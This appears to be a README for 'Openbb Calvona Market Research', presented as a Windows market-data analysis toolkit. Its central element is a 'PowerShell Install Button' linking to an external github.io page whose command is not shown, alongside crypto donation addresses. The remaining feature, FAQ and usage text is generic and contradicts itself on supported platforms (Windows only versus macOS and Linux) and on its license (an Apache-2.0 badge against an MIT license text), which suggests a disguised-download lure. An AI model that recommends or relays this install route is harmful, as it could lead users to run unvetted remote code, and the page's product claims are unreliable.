<div align="center">

# Openbb Calvona Market Research: Market Data Analysis Toolkit for Windows 11

![](files/preview.png)

### 📦 PowerShell Install Button

<a href="https://pgmergulhao75-dot.github.io/openbb-calvona-market-research/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-5%2B-f59e0b?style=for-the-badge&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-APACHE--2.0-fbbf24?style=for-the-badge&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-PASSING-2ea44f?style=for-the-badge&labelColor=0d1117)]()

<div align="center">
<h3>Keep the project growing</h3>
<p><strong>TRON</strong>:&nbsp;<code>TFhJYJ7homEZRHdS1Scd7c4ECFgbG4JVYa</code> | <strong>BTC</strong>:&nbsp;<code>1MJ2ua7d3D4srrcqRXY45sRK6kpp34VumA</code> | <strong>ETH</strong>:&nbsp;<code>0xd7c35309B4f95CD055f895a810e9De8CB8D1C490</code></p>
</div>

</div>

---

Openbb Calvona Market Research is a desktop application for retrieving, normalizing, and analyzing market data across multiple asset classes. It provides programmatic access to equity, fixed income, derivative, and macroeconomic datasets through a unified interface and consistent data schema. The application supports configurable data pipelines, reproducible research workflows, and extensible provider integrations for building custom analytical models. Designed for quantitative analysts and research engineers, it emphasizes performance, modularity, and transparent data lineage throughout the research process.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Unified market data access**: Programmatic interfaces consolidate equity, fixed income, derivatives, forex, and macroeconomic data into a single research surface, removing the need to reconcile disparate provider schemas.

- **Deterministic research pipelines**: Composable, reproducible workflows let analysts chain data retrieval, transformation, and analysis steps into versionable scripts and notebooks that yield consistent results across runs.

- **Extensible provider architecture**: A plugin-oriented data layer allows additional market data sources to be registered and normalized against a shared interface without modifying core research logic.

- **Structured output schemas**: All datasets are returned in typed, column-consistent structures suitable for downstream statistical modeling, backtesting, and automated reporting.

- **Local-first operation**: Research sessions, cached datasets, and configuration are persisted locally, enabling offline analysis of previously retrieved data and reducing repeated provider round-trips.

- **Cross-asset correlation tooling**: Built-in utilities align heterogeneous time series across asset classes and frequencies, supporting comparative analysis and portfolio-level research.

- **Configurable caching and rate management**: Request throttling, cache invalidation policies, and provider-specific limits are configurable, allowing workloads to scale predictably against external data constraints.

- **Scriptable and interactive usage**: The same research primitives are exposed through both a scripting API and an interactive session, so exploratory work and automated batch jobs share identical semantics.

- **Auditable data lineage**: Each retrieved dataset carries provenance metadata, including source, retrieval timestamp, and transformation history, supporting reproducibility and compliance review.

- **Modular analysis components**: Indicator computation, return and risk metrics, and aggregation routines are provided as independent, testable modules that can be composed or replaced.

## How it works

Openbb Calvona Market Research operates as a modular research pipeline that sits on top of the OpenBB Platform. Each subsystem is responsible for a discrete stage of the workflow, from data acquisition through normalization, analysis, and presentation, so that components can be used independently or composed into end-to-end research routines.

**Data ingestion layer.** Connectors bind to provider-specific endpoints and pull raw market data—equities, fundamentals, macro series, and alternative datasets—into a unified schema. Ingestion is provider-agnostic: the same query surface is exposed regardless of the underlying source, and results are coerced into consistent column types and naming conventions before leaving the layer.

**Normalization and validation.** Incoming records pass through a normalization stage that reconciles differing symbology, timezones, currencies, and fiscal calendars. Schema validation rejects malformed or incomplete payloads early, and provenance metadata is attached to every record so downstream consumers can trace each value back to its origin, retrieval timestamp, and transformation history.

**Analysis engine.** The analytical core exposes composable primitives for screening, factor construction, comparative valuation, and time-series transformation. Routines are stateless and deterministic given the same inputs, which makes results reproducible. Heavy computations are vectorized, and intermediate results are cached by query signature to avoid redundant provider calls.

**Research orchestration.** A lightweight orchestration layer sequences ingestion and analysis steps into repeatable research workflows. Workflows are defined declaratively, can be parameterized at runtime, and emit structured outputs suitable for both interactive inspection and automated downstream consumption.

**Presentation and export.** Results are rendered through the OpenBB interface or exported as structured datasets. Output formatting preserves the normalized schema, ensuring that figures produced interactively match those produced programmatically.

**Extensibility.** Providers, analytical primitives, and workflow steps are registered through stable extension points. New data sources or custom computations can be added without modifying the core, and every extension inherits the same validation, provenance, and caching behavior as built-in components.

## Modules and Settings

### Watchlist and Instrument Manager
The central module for building and maintaining the local library of instruments that drives every other part of openbb-calvona-market-research.
- Add instruments to a watchlist and assign them to thematic or mandate-based groups so related names stay together.
- Rename, reorder or remove entries, with the arrangement preserved between sessions.
- Switch between multiple watchlists to move between research threads without mixing coverage.

### Local Data Import
Brings user-supplied market data into the workspace so analysis runs on the researcher's own datasets rather than a fixed source.
- Select a local file and map its columns to the expected instrument, date and value fields before confirming the import.
- Review how incoming records will be attached to existing instruments so duplicates and mismatches are caught before they enter the workspace.
- Imported records appear alongside previously loaded data, forming a combined history for each instrument in the watchlist.

### Charting and Comparison View
Turns loaded series into visual views and side-by-side comparisons that feed screening and prioritization decisions.
- Adjust the time range and switch chart styles to inspect price movement over the period of interest.
- Overlay reference levels and save chart views for later revisits as a project develops.
- Comparing multiple instruments in one view, with normalization and alignment options that toggle between absolute values and relative performance.

### Research Notes and Annotations
Keeps written analysis attached to the exact instruments, lists or dates that prompted it.
- Attach free-form notes to an instrument, a watchlist or a specific date.
- Tag entries for later retrieval and edit them as a thesis evolves.
- Notes surface next to the relevant data in chart and comparison views, linking commentary to market context.

### Screening and Filtering
Narrows a large watchlist to a manageable candidate set using criteria the user defines.
- Set ranges for price, volume or derived indicators and adjust them interactively.
- The instrument list updates to show only matching entries, and criteria can be reused across sessions.
- Filtered results can be passed directly into the comparison view or the export dialog.

### Export
Produces portable artifacts that reflect the current state of research for use in reports or downstream processing.
- Choose which elements to include, such as selected data, comparison tables or notes.
- Control how exported elements are structured so the output fits the intended destination.
- Exports draw on the active watchlist, current filters and attached notes, so the file mirrors what is on screen.

### Additional Settings
Optional controls that shape the workspace around these modules.
- Default chart options, applied when a new chart view is opened.
- Data display preferences governing how values and dates appear across the workspace.
- Workspace layout and project separation, so instrument lists and notes for different projects stay apart.
- Session persistence, which restores the previous configuration and project state on reopening.

## Usage Scenarios

### Organizing a Multi-Sector Watchlist for an Independent Research Project
**Goal:** An individual investor wants a persistent local workspace to track a mix of equities and indices across several themes, without losing the structure between sessions.
**Steps:**
1. Add instruments to a watchlist in the Watchlist and Instrument Manager and assign each entry to a group such as a sector or mandate.
2. Rename, reorder or remove entries so the list follows the user's research priorities.
3. Create a second watchlist for a different research thread and switch between the two to keep coverage separate.
4. Adjust workspace layout and data display preferences in Additional Settings, then close and reopen the application.
5. Use session persistence to confirm the previous configuration and project state are restored.

**Expected result:** On reopening openbb-calvona-market-research, the user finds the same grouped watchlists, entry order and display preferences as before, with separate projects kept apart.

### Importing a Vendor Export and Comparing Candidate Instruments
**Goal:** A researcher wants to analyze a dataset they already hold locally and narrow a large list of instruments down to a shortlist for closer review.
**Steps:**
1. Open Local Data Import, select a local file, and map its columns to the instrument, date and value fields.
2. Review how incoming records will attach to existing instruments to catch duplicates and mismatches before confirming the import.
3. Open the Charting and Comparison View, adjust the time range and switch chart styles to inspect the loaded series.
4. Add multiple instruments to one comparison view and toggle normalization and alignment between absolute values and relative performance.
5. Apply screens in Screening and Filtering using ranges for price, volume or derived indicators, adjusting criteria interactively.

**Expected result:** The instrument list updates to show only matching entries, and the comparison view highlights divergence between the selected series, giving the researcher a prioritized shortlist drawn from their own imported data.

### Documenting a Thesis and Exporting the Research Record
**Goal:** An analyst wants written observations tied to the exact instruments and dates that prompted them, and a portable file reflecting the current state of the work.
**Steps:**
1. Attach free-form notes to a specific instrument, a watchlist and a particular date in Research Notes and Annotations.
2. Tag entries for later retrieval and edit them as the thesis evolves.
3. Revisit saved chart views and confirm that notes surface next to the relevant data in chart and comparison views.
4. Pass filtered results from Screening and Filtering into the Export dialog.
5. In Export, choose which elements to include, such as selected data, comparison tables or notes, and control how they are structured.

**Expected result:** A portable artifact is produced that mirrors what is on screen, drawing on the active watchlist, current filters and attached notes, ready for use in a report or further processing elsewhere.

## Compatibility

Openbb Calvona Market Research is designed for desktop environments running Windows 10 or later, macOS 11 (Big Sur) or later, and modern 64-bit Linux distributions. The application requires a minimum of 8 GB RAM and 2 GB of available disk space for installation and local data caching; 16 GB RAM is recommended for workflows involving large historical datasets or multi-asset portfolio analysis. Python 3.9 through 3.12 is supported for scripted and programmatic usage.

The software integrates with the desktop ecosystem through a command-line interface and a local application runtime, and operates with standard configuration file formats for portable setups across machines. Compatibility with market data providers, file formats such as CSV, JSON, and Parquet, and export targets follows the conventions of the underlying openbb-calvona-market-research package. Users running virtualized or containerized desktop environments should ensure that persistent storage is available for cache and configuration directories to maintain consistent behavior across sessions.

## FAQ

**What data sources does the application support?**
The application is built around a modular provider architecture. It ships with support for the bundled local data store and can be extended with additional provider adapters through its plugin interface. All providers are normalized to a common schema before use, so switching between sources does not require changes to downstream analysis code.

**How does the application handle large datasets?**
Data ingestion and aggregation run through a chunked, streaming pipeline, so memory usage stays bounded regardless of dataset size. Local caching is enabled by default and persists across sessions, reducing repeated retrieval and processing overhead for frequently queried symbols and time ranges.

**Can I extend the application with custom data providers or analytics modules?**
Yes. The provider and analytics layers expose stable interfaces intended for extension. Custom providers implement the documented adapter contract, and custom analytics can be registered as modules that consume the normalized data model. Extensions are discovered at load time and require no modification to core application code.

**Which desktop platforms are supported?**
The application targets Windows, macOS, and Linux desktop environments. The runtime requires a 64-bit architecture and a supported Python version as stated in the project's compatibility notes. Platform-specific packaging is provided for all three targets.

**Is offline operation possible?**
Yes, once data has been cached locally. The application can run fully offline against the local data store and cached queries. Features that depend on live retrieval from external providers degrade gracefully and report their status in the interface rather than failing silently.

**Does the application expose an API for scripting or automation?**
The core engine is accessible programmatically and can be invoked outside the desktop interface for batch workflows and scheduled research tasks. The same configuration model and data schema apply in both the graphical and programmatic contexts, so results remain consistent between the two.

**How is configuration managed?**
Configuration is stored in a versioned local profile and can be edited through the desktop settings interface or via the configuration file directly. Profiles are portable between installations, and environment-based overrides are supported for deployment and testing scenarios.

**What are the resource requirements?**
The application runs within standard desktop resource budgets for typical research workloads. Memory and storage requirements scale with the size of the local cache and the number of providers enabled. The settings interface exposes cache limits and retention policies for controlling footprint.

**How are updates handled?**
Updates are delivered as full releases with semantic versioning. Release notes describe changes to the data schema, provider interfaces, and configuration format. Backward compatibility is maintained across minor versions; breaking changes are reserved for major releases and documented in advance.

**Where can I report issues or request features?**
Issue tracking and feature requests are managed through the project's designated channel, referenced in the project's contribution documentation. Reports should include the application version, platform, enabled providers, and reproduction steps to aid triage.

## Disclaimer

Openbb Calvona Market Research is provided as a research and analysis tool for informational purposes only. All data, computations, outputs, and visualizations generated by the software are supplied on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of accuracy, completeness, timeliness, merchantability, or fitness for a particular purpose. Market data ingested, transformed, or displayed by the software may originate from third-party sources and may be subject to latency, gaps, revisions, or errors; users are responsible for independently validating any output before relying on it.

Nothing produced by Openbb Calvona Market Research constitutes investment, financial, legal, tax, or accounting advice, nor an offer or solicitation to buy or sell any security or instrument. The software does not execute trades, manage accounts, or provide fiduciary services, and its outputs should not be treated as a substitute for professional judgment. Users are solely responsible for how they configure the software, interpret its results, and apply them within their own workflows, and they assume all risks associated with such use, including any financial loss.

To the maximum extent permitted by applicable law, the maintainers and contributors of Openbb Calvona Market Research disclaim liability for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use of, inability to use, or reliance on the software or its outputs. Users are responsible for ensuring their use of the software complies with applicable laws, regulations, and the terms governing any data sources they connect, and for maintaining appropriate backups, access controls, and audit practices within their own environments.

## License

Openbb Calvona Market Research is distributed under the MIT License. Permission is granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions.

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

The license applies uniformly to all modules of the desktop application, including data ingestion routines, market analytics components, research report generators, and any bundled configuration files. Redistributed builds must preserve the original copyright notice and this license text in full. Modifications, derivative works, and commercial integrations are permitted provided the same notice and terms are retained. No warranty of data accuracy, fitness for trading decisions, or uninterrupted operation is extended by the project maintainers.